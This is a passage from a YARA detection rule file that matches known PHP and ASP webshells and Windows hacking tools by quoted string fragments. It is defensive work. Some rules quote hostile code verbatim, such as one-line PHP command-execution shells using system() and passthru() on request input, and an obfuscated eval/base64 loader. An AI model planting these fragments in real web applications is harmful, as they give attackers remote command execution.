\"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:03:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\"@$SERVER_NAME \\\".exec(\\\"pwd\\\")\" \n   condition: \n      all of them\n}\n\nrule Webshell_xssshell_default_RID3160 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file default.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 13:19:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"If ProxyData <> \\\"\\\" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, \\\"<br />\\\")\" \n   condition: \n      all of them\n}\n\nrule HKTL_EditServer_2_RID2D31 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file EditServer.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:21:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"@HOTMAIL.COM\" \n      $s1 = \"Press Any Ke\" \n      $s3 = \"glish MenuZ\" \n   condition: \n      all of them\n}\n\nrule HKTL_by064cli_RID2B50 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file by064cli.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:01:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"packet dropped,redirecting\" \n      $s9 = \"input the password(the default one is 'by')\" \n   condition: \n      all of them\n}\n\nrule HKTL_Mithril_dllTest_RID2EB7 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file dllTest.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:26:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"please enter the password:\" \n      $s3 = \"\\\\dllTest.pdb\" \n   condition: \n      all of them\n}\n\nrule HKTL_peek_a_boo_RID2CA7 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file peek-a-boo.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:58:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"__vbaHresultCheckObj\" \n      $s1 = \"\\\\VB\\\\VB5.OLB\" \n      $s2 = \"capGetDriverDescriptionA\" \n      $s3 = \"__vbaExceptHandler\" \n      $s4 = \"EVENT_SINK_Release\" \n      $s8 = \"__vbaErrorOverflow\" \n   condition: \n      all of them\n}\n\nrule Webshell_fmlibraryv3_RID2F17 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file fmlibraryv3.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:42:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"ExeNewRs.CommandText = \\\"UPDATE \\\" & tablename & \\\" SET \\\" & ExeNewRsValues & \\\" WHER\" \n   condition: \n      all of them\n}\n\nrule HKTL_Debug_dllTest_2_RID2E56 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file dllTest.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:10:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"\\\\Debug\\\\dllTest.pdb\" \n      $s5 = \"--list the services in the computer\" \n   condition: \n      all of them\n}\n\nrule Webshell_connector_ASP_RID2FB4 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file connector.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:08:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"If ( AttackID = BROADCAST_ATTACK )\" \n      $s4 = \"Add UNIQUE ID for victims / zombies\" \n   condition: \n      all of them\n}\n\nrule HKTL_shelltools_g0t_root_HideRun_RID3387 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file HideRun.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 14:51:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Usage -- hiderun [AppName]\" \n      $s7 = \"PVAX SW, Alexey A. Popoff, Moscow, 1997.\" \n   condition: \n      all of them\n}\n\nrule Webshell_PHP_Shell_v1_7_RID2F81 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file PHP_Shell_v1.7.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:00:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]\" \n   condition: \n      all of them\n}\n\nrule Webshell_xssshell_save_RID302A : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file save.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:28:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"RawCommand = Command & COMMAND_SEPERATOR & Param & COMMAND_SEPERATOR & AttackID\" \n      $s5 = \"VictimID = fm_NStr(Victims(i))\" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_phpinj_2_RID2FD9 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file phpinj.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:14:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"<? system(\\\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO\" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_ajan_RID2E59 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file ajan.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:10:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"entrika.write \\\"BinaryStream.SaveToFile\" \n   condition: \n      all of them\n}\n\nrule Webshell_c99shell_RID2D93 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file c99shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:37:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<br />Input&nbsp;URL:&nbsp;&lt;input&nbsp;name=\\\\\\\"uploadurl\\\\\\\"&nbsp;type=\\\\\\\"text\\\\\\\"&\" \n   condition: \n      all of them\n}\n\nrule Webshell_phpspy_2005_full_RID3082 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file phpspy_2005_full.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:42:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"echo \\\"  <td align=\\\\\\\"center\\\\\\\" nowrap valign=\\\\\\\"top\\\\\\\"><a href=\\\\\\\"?downfile=\\\".urlenco\" \n   condition: \n      all of them\n}\n\nrule HKTL_ZXshell2_0_rar_Folder_zxrecv_RID338E : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file zxrecv.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 14:52:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"RyFlushBuff\" \n      $s1 = \"teToWideChar^FiYP\" \n      $s2 = \"mdesc+8F D\" \n      $s3 = \"\\\\von76std\" \n      $s4 = \"5pur+virtul\" \n      $s5 = \"- Kablto io\" \n      $s6 = \"ac#f{lowi8a\" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_zehir4_2_RID2FA6 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file zehir4.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:06:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"\\\"Program Files\\\\Serv-u\\\\Serv\" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_indexer_2_RID303F : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file indexer.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:31:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"<td>Nerden :<td><input type=\\\"text\\\" name=\\\"nerden\\\" size=25 value=index.html></td>\" \n   condition: \n      all of them\n}\n\nrule Webshell_HYTop_DevPack_2005_RID309D : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file 2005.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:47:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath(\\\"/\\\")),\\\"\\\")\" \n      $s8 = \"scrollbar-darkshadow-color:#9C9CD3;\" \n      $s9 = \"scrollbar-face-color:#E4E4F3;\" \n   condition: \n      all of them\n}\n\nrule HKTL_root_040_zip_Folder_deploy_RID32B3 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file deploy.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 14:16:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"halon synscan 127.0.0.1 1-65536\" \n      $s8 = \"Obviously you replace the ip address with that of the target.\" \n   condition: \n      all of them\n}\n\nrule HKTL_by063cli_RID2B4F : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file by063cli.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:01:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"#popmsghello,are you all right?\" \n      $s4 = \"connect failed,check your network and remote ip.\" \n   condition: \n      all of them\n}\n\nrule HKTL_byshell063_ntboot_2_RID2FB5 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file ntboot.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:08:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"OK,job was done,cuz we have localsystem & SE_DEBUG_NAME:)\" \n   condition: \n      all of them\n}\n\nrule HKTL_u_uay_RID2AC6 : DEMO HKTL T1505_003 T1543_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file uay.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 08:21:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, T1543_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"exec \\\"c:\\\\WINDOWS\\\\System32\\\\freecell.exe\" \n      $s9 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\uay.sys\\\\Security\" \n   condition: \n      1 of them\n}\n\nrule HKTL_pwreveal_RID2C09 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file pwreveal.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:32:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"*<Blank - no es\" \n      $s3 = \"JDiamondCS \" \n      $s8 = \"sword set> [Leith=0 bytes]\" \n      $s9 = \"ION\\\\System\\\\Floating-\" \n   condition: \n      all of them\n}\n\nrule HKTL_vanquish_2_RID2CA3 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file vanquish.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:57:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Vanquish - DLL injection failed:\" \n   condition: \n      all of them\n}\n\nrule Webshell_down_rar_Folder_down_RID32D4 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file down.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 14:21:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"response.write \\\"<font color=blue size=2>NetBios Name: \\\\\\\\\\\"  & Snet.ComputerName &\" \n   condition: \n      all of them\n}\n\nrule Webshell_cmdShell_ASP_RID2F15 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file cmdShell.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:42:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if cmdPath=\\\"wscriptShell\\\" then\" \n   condition: \n      all of them\n}\n\nrule HKTL_portlessinst_RID2DDD : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file portlessinst.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:50:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Fail To Open Registry\" \n      $s3 = \"f<-WLEggDr\\\"\" \n      $s6 = \"oMemoryCreateP\" \n   condition: \n      all of them\n}\n\nrule HKTL_SetupBDoor_RID2C8A : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file SetupBDoor.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:53:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\BDoor\\\\SetupBDoor\" \n   condition: \n      all of them\n}\n\nrule Webshell_phpshell_3_RID2E98 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file phpshell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:21:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"<input name=\\\"submit_btn\\\" type=\\\"submit\\\" value=\\\"Execute Command\\\"></p>\" \n      $s5 = \"      echo \\\"<option value=\\\\\\\"$work_dir\\\\\\\" selected>Current Directory</option>\\\\n\\\";\" \n   condition: \n      all of them\n}\n\nrule HKTL_BIN_Server_RID2C52 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file Server.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:44:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"configserver\" \n      $s1 = \"GetLogicalDrives\" \n      $s2 = \"WinExec\" \n      $s4 = \"fxftest\" \n      $s5 = \"upfileok\" \n      $s7 = \"upfileer\" \n   condition: \n      all of them\n}\n\nrule Webshell_HYTop2006_rar_Folder_2006_RID32C8 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file 2006.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 14:19:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"strBackDoor = strBackDoor \" \n   condition: \n      all of them\n}\n\nrule Webshell_r57shell_3_RID2E2E : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file r57shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:03:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<b>\\\".$_POST['cmd']\" \n   condition: \n      all of them\n}\n\nrule HKTL_HDConfig_RID2B85 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file HDConfig.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:10:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"An encryption key is derived from the password hash. \" \n      $s3 = \"A hash object has been created. \" \n      $s4 = \"Error during CryptCreateHash!\" \n      $s5 = \"A new key container has been created.\" \n      $s6 = \"The password has been added to the hash. \" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_ajan_2_RID2EEA : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file ajan.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:34:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"\\\"Set WshShell = CreateObject(\\\"\\\"WScript.Shell\\\"\\\")\" \n      $s3 = \"/file.zip\" \n   condition: \n      all of them\n}\n\nrule WebShell_hiddens_shell_v1_RID30E2 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file hiddens shell v1.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:58:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U\" \n   condition: \n      all of them\n}\n\nrule WebShell_Uploader_RID2DC2 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file Uploader.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 10:45:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"move_uploaded_file($userfile, \\\"entrika.php\\\"); \" fullword\n   condition: \n      all of them\n}\n\nrule WebShell_php_webshells_README_RID3203 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file README.md\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 13:47:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Common php webshells. Do not host the file(s) in your server!\" fullword\n      $s1 = \"php-webshells\" fullword\n   condition: \n      all of them\n}\n\nrule WebShell_accept_language_RID3099 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file accept_language.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:46:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php passthru(getenv(\\\"HTTP_ACCEPT_LANGUAGE\\\")); echo '<br> by q1w2e3r4'; ?>\" fullword\n   condition: \n      all of them\n}\n\nrule WebShell_mysql_tool_Apr14_RID30C0 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file mysql_tool.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:53:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2025-01-29\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s12 = \"$dump .= \\\"-- Dumping data for table '$table'\\\\n\\\";\" fullword\n      $s20 = \"$dump .= \\\"CREATE TABLE $table (\\\\n\\\";\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_HYTop_DevPack_fso_RID311E : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file fso.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 13:08:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<!-- PageFSO Below -->\" \n      $s1 = \"theFile.writeLine(\\\"<script language=\\\"\\\"vbscript\\\"\\\" runat=server>if request(\\\"\\\"\\\"&cli\" \n   condition: \n      all of them\n}\n\nrule Webshell_FeliksPack3___PHP_Shells_ssh_RID3532 : DEMO FILE T1021_004 T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells PHP Webshell - file ssh.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 16:02:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, T1021_004, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"eval(gzinflate(str_rot13(base64_decode('\" \n   condition: \n      all of them\n}\n\nrule MAL_Debug_BDoor_RID2C66 : DEMO MAL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file BDoor.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 09:47:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\BDoor\\\\\" \n      $s4 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" \n   condition: \n      all of them\n}\n\nrule ZXshell2_0_rar_Folder_ZXshell_RID3224 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file ZXshell.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 13:52:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"WPreviewPagesn\" \n      $s1 = \"DA!OLUTELY N\" \n   condition: \n      all of them\n}\n\nrule thelast_orice2_RID2CA9 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file orice2.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 09:58:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, 